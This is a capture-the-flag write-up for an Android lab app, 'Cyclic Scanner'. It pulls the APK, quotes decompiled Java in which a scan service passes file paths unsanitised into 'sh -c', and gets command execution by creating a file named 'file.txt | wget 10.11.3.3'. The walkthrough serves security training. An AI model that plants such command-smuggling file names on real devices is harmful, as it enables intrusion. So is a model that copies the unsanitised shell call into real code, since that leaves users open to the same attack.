---
layout: post
title: Cyclic Scanner
date: 2024-08-09 22:49 -0400
img_path: /assets/img/cyclicScanner/
published: true
categories: ["Mobile Challenge","Mobile Hacking Lab"]
tags: ["Exploit exported services", "Static analysis","RCE"]
toc: true
---
# Android Services Challenge 

Objetive is exploit a vulnerability inherent within an Android service to achieve remote code execution. 

##  Methodology

- Utilize reverse engineering tools to dissect the application's code, focusing on how it implements Android services.
- Identify the vulnerability within the Android service and develop a strategy for its exploitation.
- Craft a malicious payload that is specifically designed to leverage the identified vulnerability within the Android service.
- Deploy the payload to achieve execution of the code on the device that runs the vulnerable application.

## Challenge walkthrough

We start extracting the apk file from the challenge app. 
```sh
adb shell pm path com.mobilehackinglab.cyclicscanner
package:/data/app/~~qM4I86KbSswb6BplSzhL0A==/com.mobilehackinglab.cyclicscanner-rtyKTMCcoKLT7WV1i1hWWA==/base.apk 
adb pull /data/app/~~qM4I86KbSswb6BplSzhL0A==/com.mobilehackinglab.cyclicscanner-rtyKTMCcoKLT7WV1i1hWWA==/base.apk cyclicscanner.apk
```

The application had a service ``scanner.ScanService``, its the only services but its not exported
```xml
        <service
            android:name="com.mobilehackinglab.cyclicscanner.scanner.ScanService"
            android:exported="false"/>
```

The ScanService hadf a function ``handleMessage`` that take a path file as a input
```java
        @Override // android.os.Handler
        public void handleMessage(Message msg) {
            Intrinsics.checkNotNullParameter(msg, "msg");
            try {
                System.out.println((Object) "starting file scan...");
                File externalStorageDirectory = Environment.getExternalStorageDirectory();
                Intrinsics.checkNotNullExpressionValue(externalStorageDirectory, "getExternalStorageDirectory(...)");
                Sequence $this$forEach$iv = FilesKt.walk$default(externalStorageDirectory, null, 1, null);
                for (Object element$iv : $this$forEach$iv) {
                    File file = (File) element$iv;
                    if (file.canRead() && file.isFile()) {
                        System.out.print((Object) (file.getAbsolutePath() + "..."));
                        boolean safe = ScanEngine.INSTANCE.scanFile(file);
                        System.out.println((Object) (safe ? "SAFE" : "INFECTED"));
                    }
                }
                System.out.println((Object) "finished file scan!");
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            Message $this$handleMessage_u24lambda_u241 = obtainMessage();
            $this$handleMessage_u24lambda_u241.arg1 = msg.arg1;
            sendMessageDelayed($this$handleMessage_u24lambda_u241, ScanService.SCAN_INTERVAL);
        }
```

Running the application we saw some switch in the Main screen 

![Switch](image.png)


If we click the button, we saw on logcat a message **Attempted to start a foreground service ..**
![logctat](image-1.png)

This will launch the service that will check all the files inside the ``externalStorageDirectory()`` which means ``/storage/emulated/0`` , this is the only way we can interact with the services due to is not exported. Lets see that function ``ScanEngine.INSTANCE.scanFile(file)`` 

```java

        public final boolean scanFile(File file) {
            Intrinsics.checkNotNullParameter(file, "file");
            try {
                String command = "toybox sha1sum " + file.getAbsolutePath();
                Process process = new ProcessBuilder(new String[0]).command("sh", "-c", command).directory(Environment.getExternalStorageDirectory()).redirectErrorStream(true).start();
                InputStream inputStream = process.getInputStream();
                Intrinsics.checkNotNullExpressionValue(inputStream, "getInputStream(...)");
                Reader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);
                BufferedReader bufferedReader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);
                try {
                    BufferedReader reader = bufferedReader;
                    String output = reader.readLine();
                    Intrinsics.checkNotNull(output);
                    Object fileHash = StringsKt.substringBefore$default(output, "  ", (String) null, 2, (Object) null);
                    Unit unit = Unit.INSTANCE;
                    Closeable.closeFinally(bufferedReader, null);
                    return !ScanEngine.KNOWN_MALWARE_SAMPLES.containsValue(fileHash);
                } finally {
                }
            } catch (Exception e) {
                e.printStackTrace();
                return false;
            }
        }
```

Inmediatly catch my atention the Process line where a command its executed with our input file concatenated the name of the file ``(file.getAboslutePath())```.
We can create a malicious filename like ``file.txt | wget 10.11.3.3`` and placed inside externalStorageDirectory


![Payload](image-2.png)

and now we acheive remote command execution 

![alt text](image-3.png)
 
